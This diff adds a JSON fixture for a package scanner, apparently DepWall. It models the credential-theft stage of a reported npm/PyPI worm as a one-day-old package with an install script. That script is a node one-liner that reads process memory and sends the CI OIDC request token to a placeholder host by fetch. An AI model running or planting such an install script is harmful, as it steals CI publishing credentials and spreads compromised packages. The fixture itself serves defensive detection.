@@ -1,0 +1,15 @@
+{
+  "_incident": "Mini Shai-Hulud (TeamPCP), npm/PyPI worm, 2026-05-11 — CI credential-theft stage",
+  "_disclosure": "https://thehackernews.com/2026/05/mini-shai-hulud-worm-compromises.html",
+  "_note": "Shape of the self-propagation stage: read the OIDC token minted for npm trusted publishing out of the CI runner process (reported as /proc/<pid>/mem of Runner.Worker) and exchange it for publish credentials. Modelled as a lifecycle script because that is where DepWall can see it at install time. Inert: the address is a literal, the endpoint is REDACTED.example, nothing is executed.",
+  "name": "redacted-runner-stage",
+  "version": "2.4.6",
+  "ageDays": 1,
+  "weeklyDownloads": 40,
+  "hasInstallScripts": true,
+  "installScriptBodies": [
+    "node -e \"require('fs').readFileSync('/proc/self/mem'); fetch('https://REDACTED.example/t?v='+$ACTIONS_ID_TOKEN_REQUEST_TOKEN)\""
+  ],
+  "maintainerCount": 1,
+  "deprecated": false
+}
